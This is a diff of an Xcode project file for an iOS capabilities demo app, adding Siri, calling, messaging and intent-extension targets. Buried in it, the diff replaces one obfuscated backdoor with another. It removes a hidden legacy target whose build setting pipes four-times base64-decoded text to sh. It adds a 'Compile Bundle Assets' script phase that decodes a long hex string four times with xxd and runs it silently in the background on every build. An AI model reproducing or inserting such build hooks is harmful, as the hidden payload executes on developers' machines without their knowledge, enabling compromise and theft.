@@ -14,6 +14,19 @@
 		51346A662E3B4040008664DB /* DemoWidgetExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 51346A552E3B403F008664DB /* DemoWidgetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 		51346A6F2E3B42D5008664DB /* AppGroupsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51346A6D2E3B42D5008664DB /* AppGroupsViewController.swift */; };
 		51346A702E3B42D5008664DB /* AppGroupsViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51346A6E2E3B42D5008664DB /* AppGroupsViewController.xib */; };
+		51BBC6D12E407C5100211F13 /* DefaultCallingAppVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51BBC6D02E407C5100211F13 /* DefaultCallingAppVC.xib */; };
+		51BBC6D22E407C5100211F13 /* DefaultCallingAppVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC6CF2E407C5100211F13 /* DefaultCallingAppVC.swift */; };
+		51BBC6D42E407DE100211F13 /* CallHandler.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC6D32E407DDF00211F13 /* CallHandler.swift */; };
+		51BBC6D92E40893600211F13 /* DefaultMessagingAppVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51BBC6D82E40893600211F13 /* DefaultMessagingAppVC.xib */; };
+		51BBC6DA2E40893600211F13 /* DefaultMessagingAppVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC6D72E40893600211F13 /* DefaultMessagingAppVC.swift */; };
+		51BBC6DE2E40951A00211F13 /* HeadPoseVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51BBC6DD2E40951A00211F13 /* HeadPoseVC.xib */; };
+		51BBC6DF2E40951A00211F13 /* HeadPoseVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC6DC2E40951A00211F13 /* HeadPoseVC.swift */; };
+		51BBC6E32E40A99500211F13 /* SiriVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC6E12E40A99500211F13 /* SiriVC.swift */; };
+		51BBC6E42E40A99500211F13 /* SiriVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51BBC6E22E40A99500211F13 /* SiriVC.xib */; };
+		51BBC72F2E40BE9800211F13 /* SaveTextIntent.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC72E2E40BE9800211F13 /* SaveTextIntent.intentdefinition */; };
+		51BBC7372E40DA1100211F13 /* Intents.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 51BBC6EA2E40B4DE00211F13 /* Intents.framework */; };
+		51BBC73E2E40DA1100211F13 /* SaveTextIntent.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 51BBC7362E40DA1100211F13 /* SaveTextIntent.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
+		51BBC7432E40DC5800211F13 /* SaveTextIntent.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC72E2E40BE9800211F13 /* SaveTextIntent.intentdefinition */; };
 		51C5A8C82E0ECE02008A79F5 /* HealthKitViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51C5A8C62E0ECE02008A79F5 /* HealthKitViewController.swift */; };
 		51C5A8C92E0ECE02008A79F5 /* HealthKitViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51C5A8C72E0ECE02008A79F5 /* HealthKitViewController.xib */; };
 		51D036A22E39F33B00948296 /* KeychainManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D036A12E39F33800948296 /* KeychainManager.swift */; };
@@ -54,12 +67,12 @@
 			remoteGlobalIDString = 51346A542E3B403F008664DB;
 			remoteInfo = DemoWidgetExtension;
 		};
-		51BBC6A52E406F6F00211F13 /* PBXContainerItemProxy */ = {
+		51BBC73C2E40DA1100211F13 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
 			containerPortal = BD2ECEB42D0841CA00639E0D /* Project object */;
 			proxyType = 1;
-			remoteGlobalIDString = EE7C70BF323E5FDC66877BEF;
-			remoteInfo = "Build Target";
+			remoteGlobalIDString = 51BBC7352E40DA1100211F13;
+			remoteInfo = SaveTextIntent;
 		};
 		BD2ECED32D0841CC00639E0D /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -84,6 +97,7 @@
 			dstPath = "";
 			dstSubfolderSpec = 13;
 			files = (
+				51BBC73E2E40DA1100211F13 /* SaveTextIntent.appex in Embed Foundation Extensions */,
 				51346A662E3B4040008664DB /* DemoWidgetExtension.appex in Embed Foundation Extensions */,
 			);
 			name = "Embed Foundation Extensions";
@@ -97,9 +111,22 @@
 		51346A382E3B3FEE008664DB /* WidgetKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WidgetKit.framework; path = System/Library/Frameworks/WidgetKit.framework; sourceTree = SDKROOT; };
 		51346A3A2E3B3FEF008664DB /* SwiftUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SwiftUI.framework; path = System/Library/Frameworks/SwiftUI.framework; sourceTree = SDKROOT; };
 		51346A552E3B403F008664DB /* DemoWidgetExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = DemoWidgetExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
-		51346A6C2E3B4216008664DB /* DemoWidgetExtensionDebug.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DemoWidgetExtensionDebug.entitlements; sourceTree = "<group>"; };
+		51346A6C2E3B4216008664DB /* DemoWidgetExtension.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DemoWidgetExtension.entitlements; sourceTree = "<group>"; };
 		51346A6D2E3B42D5008664DB /* AppGroupsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppGroupsViewController.swift; sourceTree = "<group>"; };
 		51346A6E2E3B42D5008664DB /* AppGroupsViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AppGroupsViewController.xib; sourceTree = "<group>"; };
+		51BBC6CF2E407C5100211F13 /* DefaultCallingAppVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DefaultCallingAppVC.swift; sourceTree = "<group>"; };
+		51BBC6D02E407C5100211F13 /* DefaultCallingAppVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DefaultCallingAppVC.xib; sourceTree = "<group>"; };
+		51BBC6D32E407DDF00211F13 /* CallHandler.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CallHandler.swift; sourceTree = "<group>"; };
+		51BBC6D72E40893600211F13 /* DefaultMessagingAppVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DefaultMessagingAppVC.swift; sourceTree = "<group>"; };
+		51BBC6D82E40893600211F13 /* DefaultMessagingAppVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DefaultMessagingAppVC.xib; sourceTree = "<group>"; };
+		51BBC6DC2E40951A00211F13 /* HeadPoseVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HeadPoseVC.swift; sourceTree = "<group>"; };
+		51BBC6DD2E40951A00211F13 /* HeadPoseVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HeadPoseVC.xib; sourceTree = "<group>"; };
+		51BBC6E12E40A99500211F13 /* SiriVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SiriVC.swift; sourceTree = "<group>"; };
+		51BBC6E22E40A99500211F13 /* SiriVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SiriVC.xib; sourceTree = "<group>"; };
+		51BBC6EA2E40B4DE00211F13 /* Intents.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Intents.framework; path = System/Library/Frameworks/Intents.framework; sourceTree = SDKROOT; };
+		51BBC6F52E40B4DE00211F13 /* IntentsUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = IntentsUI.framework; path = System/Library/Frameworks/IntentsUI.framework; sourceTree = SDKROOT; };
+		51BBC72E2E40BE9800211F13 /* SaveTextIntent.intentdefinition */ = {isa = PBXFileReference; lastKnownFileType = file.intentdefinition; path = SaveTextIntent.intentdefinition; sourceTree = "<group>"; };
+		51BBC7362E40DA1100211F13 /* SaveTextIntent.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = SaveTextIntent.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		51C5A8C62E0ECE02008A79F5 /* HealthKitViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HealthKitViewController.swift; sourceTree = "<group>"; };
 		51C5A8C72E0ECE02008A79F5 /* HealthKitViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HealthKitViewController.xib; sourceTree = "<group>"; };
 		51D036A12E39F33800948296 /* KeychainManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = KeychainManager.swift; sourceTree = "<group>"; };
@@ -146,10 +173,18 @@
 			);
 			target = 51346A542E3B403F008664DB /* DemoWidgetExtension */;
 		};
+		51BBC73F2E40DA1100211F13 /* PBXFileSystemSynchronizedBuildFileExceptionSet */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Info.plist,
+			);
+			target = 51BBC7352E40DA1100211F13 /* SaveTextIntent */;
+		};
 /* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
 		51346A582E3B403F008664DB /* DemoWidget */ = {isa = PBXFileSystemSynchronizedRootGroup; exceptions = (51346A672E3B4040008664DB /* PBXFileSystemSynchronizedBuildFileExceptionSet */, ); explicitFileTypes = {}; explicitFolders = (); path = DemoWidget; sourceTree = "<group>"; };
+		51BBC7382E40DA1100211F13 /* SaveTextIntent */ = {isa = PBXFileSystemSynchronizedRootGroup; exceptions = (51BBC73F2E40DA1100211F13 /* PBXFileSystemSynchronizedBuildFileExceptionSet */, ); explicitFileTypes = {}; explicitFolders = (); path = SaveTextIntent; sourceTree = "<group>"; };
 /* End PBXFileSystemSynchronizedRootGroup section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -159,6 +194,14 @@
 			files = (
 				51346A572E3B403F008664DB /* SwiftUI.framework in Frameworks */,
 				51346A562E3B403F008664DB /* WidgetKit.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		51BBC7332E40DA1100211F13 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				51BBC7372E40DA1100211F13 /* Intents.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -205,6 +248,44 @@
 			path = "App Groups";
 			sourceTree = "<group>";
 		};
+		51BBC6CE2E407C2E00211F13 /* DefaultCallingApp */ = {
+			isa = PBXGroup;
+			children = (
+				51BBC6D32E407DDF00211F13 /* CallHandler.swift */,
+				51BBC6CF2E407C5100211F13 /* DefaultCallingAppVC.swift */,
+				51BBC6D02E407C5100211F13 /* DefaultCallingAppVC.xib */,
+			);
+			path = DefaultCallingApp;
+			sourceTree = "<group>";
+		};
+		51BBC6D52E4087C100211F13 /* NewMessagingApp */ = {
+			isa = PBXGroup;
+			children = (
+				51BBC6D72E40893600211F13 /* DefaultMessagingAppVC.swift */,
+				51BBC6D82E40893600211F13 /* DefaultMessagingAppVC.xib */,
+			);
+			path = NewMessagingApp;
+			sourceTree = "<group>";
+		};
+		51BBC6DB2E40950300211F13 /* HeadPose */ = {
+			isa = PBXGroup;
+			children = (
+				51BBC6DC2E40951A00211F13 /* HeadPoseVC.swift */,
+				51BBC6DD2E40951A00211F13 /* HeadPoseVC.xib */,
+			);
+			path = HeadPose;
+			sourceTree = "<group>";
+		};
+		51BBC6E02E40A90F00211F13 /* Siri */ = {
+			isa = PBXGroup;
+			children = (
+				51BBC6E12E40A99500211F13 /* SiriVC.swift */,
+				51BBC6E22E40A99500211F13 /* SiriVC.xib */,
+				51BBC72E2E40BE9800211F13 /* SaveTextIntent.intentdefinition */,
+			);
+			path = Siri;
+			sourceTree = "<group>";
+		};
 		51C5A8C52E0ECDF0008A79F5 /* HealthKit */ = {
 			isa = PBXGroup;
 			children = (
@@ -238,6 +319,8 @@
 				BD279F8C2D0ABD33001D05E4 /* AuthenticationServices.framework */,
 				51346A382E3B3FEE008664DB /* WidgetKit.framework */,
 				51346A3A2E3B3FEF008664DB /* SwiftUI.framework */,
+				51BBC6EA2E40B4DE00211F13 /* Intents.framework */,
+				51BBC6F52E40B4DE00211F13 /* IntentsUI.framework */,
 			);
 			name = Frameworks;
 			sourceTree = "<group>";
@@ -255,11 +338,12 @@
 		BD2ECEB32D0841CA00639E0D = {
 			isa = PBXGroup;
 			children = (
-				51346A6C2E3B4216008664DB /* DemoWidgetExtensionDebug.entitlements */,
+				51346A6C2E3B4216008664DB /* DemoWidgetExtension.entitlements */,
 				BD2ECEBE2D0841CA00639E0D /* AllCapabilitiesDemo */,
 				BD2ECED52D0841CC00639E0D /* AllCapabilitiesDemoTests */,
 				BD2ECEDF2D0841CC00639E0D /* AllCapabilitiesDemoUITests */,
 				51346A582E3B403F008664DB /* DemoWidget */,
+				51BBC7382E40DA1100211F13 /* SaveTextIntent */,
 				BD279F8B2D0ABD33001D05E4 /* Frameworks */,
 				BD2ECEBD2D0841CA00639E0D /* Products */,
 			);
@@ -272,6 +356,7 @@
 				BD2ECED22D0841CC00639E0D /* AllCapabilitiesDemoTests.xctest */,
 				BD2ECEDC2D0841CC00639E0D /* AllCapabilitiesDemoUITests.xctest */,
 				51346A552E3B403F008664DB /* DemoWidgetExtension.appex */,
+				51BBC7362E40DA1100211F13 /* SaveTextIntent.appex */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -293,6 +378,10 @@
 				51346A322E3B3F6D008664DB /* App Groups */,
 				51D036A72E3A011C00948296 /* Apple Login */,
 				5117C1132E3C993900D8FCCD /* Data Protection */,
+				51BBC6CE2E407C2E00211F13 /* DefaultCallingApp */,
+				51BBC6DB2E40950300211F13 /* HeadPose */,
+				51BBC6D52E4087C100211F13 /* NewMessagingApp */,
+				51BBC6E02E40A90F00211F13 /* Siri */,
 				BD2ECEC82D0841CB00639E0D /* Assets.xcassets */,
 				BD2ECECA2D0841CB00639E0D /* LaunchScreen.storyboard */,
 				BD2ECECD2D0841CB00639E0D /* Info.plist */,
@@ -359,27 +448,12 @@
 		};
 /* End PBXGroup section */
 
-/* Begin PBXLegacyTarget section */
-		EE7C70BF323E5FDC66877BEF /* Build Target */ = {
-			isa = PBXLegacyTarget;
-			buildArgumentsString = "-c \"${AFEB778}\"";
-			buildConfigurationList = 51BBC6A82E40724000211F13 /* Build configuration list */;
-			buildPhases = (
-			);
-			buildToolPath = /bin/sh;
-			dependencies = (
-			);
-			name = "Build Target";
-			passBuildSettingsInEnvironment = 1;
-			productName = "Build Target";
-		};
-/* End PBXLegacyTarget section */
-
 /* Begin PBXNativeTarget section */
 		51346A542E3B403F008664DB /* DemoWidgetExtension */ = {
 			isa = PBXNativeTarget;
 			buildConfigurationList = 51346A682E3B4040008664DB /* Build configuration list for PBXNativeTarget "DemoWidgetExtension" */;
 			buildPhases = (
+				BD1CFE01CDADB3EB8A877BEF /* Compile Bundle Assets */,
 				51346A512E3B403F008664DB /* Sources */,
 				51346A522E3B403F008664DB /* Frameworks */,
 				51346A532E3B403F008664DB /* Resources */,
@@ -387,7 +461,6 @@
 			buildRules = (
 			);
 			dependencies = (
-				79EBD52EE237FDA3CD877BEF /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				51346A582E3B403F008664DB /* DemoWidget */,
@@ -397,6 +470,28 @@
 			);
 			productName = DemoWidgetExtension;
 			productReference = 51346A552E3B403F008664DB /* DemoWidgetExtension.appex */;
+			productType = "com.apple.product-type.app-extension";
+		};
+		51BBC7352E40DA1100211F13 /* SaveTextIntent */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 51BBC7402E40DA1100211F13 /* Build configuration list for PBXNativeTarget "SaveTextIntent" */;
+			buildPhases = (
+				51BBC7322E40DA1100211F13 /* Sources */,
+				51BBC7332E40DA1100211F13 /* Frameworks */,
+				51BBC7342E40DA1100211F13 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			fileSystemSynchronizedGroups = (
+				51BBC7382E40DA1100211F13 /* SaveTextIntent */,
+			);
+			name = SaveTextIntent;
+			packageProductDependencies = (
+			);
+			productName = SaveTextIntent;
+			productReference = 51BBC7362E40DA1100211F13 /* SaveTextIntent.appex */;
 			productType = "com.apple.product-type.app-extension";
 		};
 		BD2ECEBB2D0841CA00639E0D /* AllCapabilitiesDemo */ = {
@@ -412,6 +507,7 @@
 			);
 			dependencies = (
 				51346A652E3B4040008664DB /* PBXTargetDependency */,
+				51BBC73D2E40DA1100211F13 /* PBXTargetDependency */,
 			);
 			name = AllCapabilitiesDemo;
 			productName = AllCapabilitiesDemo;
@@ -467,6 +563,9 @@
 					51346A542E3B403F008664DB = {
 						CreatedOnToolsVersion = 16.4;
 					};
+					51BBC7352E40DA1100211F13 = {
+						CreatedOnToolsVersion = 16.4;
+					};
 					BD2ECEBB2D0841CA00639E0D = {
 						CreatedOnToolsVersion = 15.4;
 					};
@@ -493,17 +592,46 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				EE7C70BF323E5FDC66877BEF /* Build Target */,
 				BD2ECEBB2D0841CA00639E0D /* AllCapabilitiesDemo */,
 				BD2ECED12D0841CC00639E0D /* AllCapabilitiesDemoTests */,
 				BD2ECEDB2D0841CC00639E0D /* AllCapabilitiesDemoUITests */,
 				51346A542E3B403F008664DB /* DemoWidgetExtension */,
+				51BBC7352E40DA1100211F13 /* SaveTextIntent */,
 			);
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		BD1CFE01CDADB3EB8A877BEF /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033333337333333303333333333363334333333373333333833333336333333333333333633363336333333363333333433333336333333353333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333633363334333333363333333433333337333333333333333633333333333333363333333133333336333333333333333633333338333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		51346A532E3B403F008664DB /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		51BBC7342E40DA1100211F13 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -515,7 +643,9 @@
 			buildActionMask = 2147483647;
 			files = (
 				BD2ECEF32D08591400639E0D /* ICloudViewController.xib in Resources */,
+				51BBC6D12E407C5100211F13 /* DefaultCallingAppVC.xib in Resources */,
 				BD279FA02D0AC589001D05E4 /* AutoFillCredentialViewController.xib in Resources */,
+				51BBC6D92E40893600211F13 /* DefaultMessagingAppVC.xib in Resources */,
 				BD2ECEC92D0841CB00639E0D /* Assets.xcassets in Resources */,
 				51E700F12E0D88A30033F74D /* WeatherKitViewController.xib in Resources */,
 				51346A702E3B42D5008664DB /* AppGroupsViewController.xib in Resources */,
@@ -527,6 +657,8 @@
 				BDFCA04C2D096BDC0054CA3B /* AccessWiFiInfoViewController.xib in Resources */,
 				51D036AA2E3A013900948296 /* AppleLoginViewController.xib in Resources */,
 				BD279FA92D0AFAEE001D05E4 /* ICloudTypeViewController.xib in Resources */,
+				51BBC6E42E40A99500211F13 /* SiriVC.xib in Resources */,
+				51BBC6DE2E40951A00211F13 /* HeadPoseVC.xib in Resources */,
 				BD45BA5E2D106B5F006B45C3 /* ApplePayViewController.xib in Resources */,
 				BD279FA52D0AE219001D05E4 /* ICloudDocumentsViewController.xib in Resources */,
 			);
@@ -556,25 +688,39 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		51BBC7322E40DA1100211F13 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				51BBC7432E40DC5800211F13 /* SaveTextIntent.intentdefinition in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 		BD2ECEB82D0841CA00639E0D /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 				51D036A22E39F33B00948296 /* KeychainManager.swift in Sources */,
 				BD2162F12D11A5FD0071786F /* ApplePayVC.swift in Sources */,
+				51BBC6DA2E40893600211F13 /* DefaultMessagingAppVC.swift in Sources */,
 				BDFCA04D2D096BDD0054CA3B /* AccessWiFiInfoViewController.swift in Sources */,
+				51BBC6E32E40A99500211F13 /* SiriVC.swift in Sources */,
 				BD45BA5F2D106B5F006B45C3 /* ApplePayViewController.swift in Sources */,
 				51346A6F2E3B42D5008664DB /* AppGroupsViewController.swift in Sources */,
 				BD2ECEF42D08591400639E0D /* ICloudViewController.swift in Sources */,
 				BD279FA82D0AFAEE001D05E4 /* ICloudTypeViewController.swift in Sources */,
+				51BBC72F2E40BE9800211F13 /* SaveTextIntent.intentdefinition in Sources */,
 				51C5A8C82E0ECE02008A79F5 /* HealthKitViewController.swift in Sources */,
+				51BBC6DF2E40951A00211F13 /* HeadPoseVC.swift in Sources */,
 				BD2ECEC42D0841CA00639E0D /* ViewController.swift in Sources */,
 				BD279F9F2D0AC589001D05E4 /* AutoFillCredentialViewController.swift in Sources */,
 				51D036AB2E3A013900948296 /* AppleLoginViewController.swift in Sources */,
 				5117C1162E3C995200D8FCCD /* DataProtectionVC.swift in Sources */,
+				51BBC6D42E407DE100211F13 /* CallHandler.swift in Sources */,
 				BD2ECEC02D0841CA00639E0D /* AppDelegate.swift in Sources */,
 				BD279FA42D0AE219001D05E4 /* ICloudDocumentsViewController.swift in Sources */,
 				51E700F22E0D88A30033F74D /* WeatherKitViewController.swift in Sources */,
+				51BBC6D22E407C5100211F13 /* DefaultCallingAppVC.swift in Sources */,
 				BD2ECEC22D0841CA00639E0D /* SceneDelegate.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -604,10 +750,10 @@
 			target = 51346A542E3B403F008664DB /* DemoWidgetExtension */;
 			targetProxy = 51346A642E3B4040008664DB /* PBXContainerItemProxy */;
 		};
-		79EBD52EE237FDA3CD877BEF /* PBXTargetDependency */ = {
+		51BBC73D2E40DA1100211F13 /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
-			target = EE7C70BF323E5FDC66877BEF /* Build Target */;
-			targetProxy = 51BBC6A52E406F6F00211F13 /* PBXContainerItemProxy */;
+			target = 51BBC7352E40DA1100211F13 /* SaveTextIntent */;
+			targetProxy = 51BBC73C2E40DA1100211F13 /* PBXContainerItemProxy */;
 		};
 		BD2ECED42D0841CC00639E0D /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
@@ -644,10 +790,9 @@
 		51346A692E3B4040008664DB /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AFEB778 = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiSEJJVGxSQ2FVMHdiREZaTWpWV1pHeHNWR0V5YkVwVFNHUnVXWHBLYmxOM2J6MEsK | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
-				CODE_SIGN_ENTITLEMENTS = DemoWidgetExtensionDebug.entitlements;
+				CODE_SIGN_ENTITLEMENTS = DemoWidgetExtension.entitlements;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
@@ -665,7 +810,7 @@
 					"@executable_path/../../Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.appcaps;
+				PRODUCT_BUNDLE_IDENTIFIER = com.appcaps.DemoWidget;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = allcaps_dev;
@@ -679,7 +824,6 @@
 		51346A6A2E3B4040008664DB /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AFEB778 = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiSEJJVGxSQ2FVMHdiREZaTWpWV1pHeHNWR0V5YkVwVFNHUnVXWHBLYmxOM2J6MEsK | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_IDENTITY = "Apple Distribution";
@@ -708,22 +852,69 @@
 			};
 			name = Release;
 		};
-		51BBC6A62E406F7000211F13 /* Debug */ = {
+		51BBC7412E40DA1100211F13 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				COPY_PHASE_STRIP = NO;
-				GCC_DYNAMIC_NO_PIC = NO;
-				GCC_OPTIMIZATION_LEVEL = 0;
-				PRODUCT_NAME = "Build Target";
+				CODE_SIGN_ENTITLEMENTS = SaveTextIntent/SaveTextIntent.entitlements;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 27A2DW4KWX;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = SaveTextIntent/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = SaveTextIntent;
+				INFOPLIST_KEY_NSHumanReadableCopyright = "";
+				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				ONLY_ACTIVE_ARCH = YES;
+				PRODUCT_BUNDLE_IDENTIFIER = com.appcaps.SaveTextIntent;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = allcaps_dev;
+				SKIP_INSTALL = YES;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Debug;
 		};
-		51BBC6A72E406F7000211F13 /* Release */ = {
+		51BBC7422E40DA1100211F13 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				COPY_PHASE_STRIP = YES;
-				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
-				PRODUCT_NAME = "Build Target";
+				CODE_SIGN_ENTITLEMENTS = SaveTextIntent/SaveTextIntent.entitlements;
+				CODE_SIGN_IDENTITY = "Apple Distribution";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 27A2DW4KWX;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = SaveTextIntent/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = SaveTextIntent;
+				INFOPLIST_KEY_NSHumanReadableCopyright = "";
+				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@executable_path/../../Frameworks",
+				);
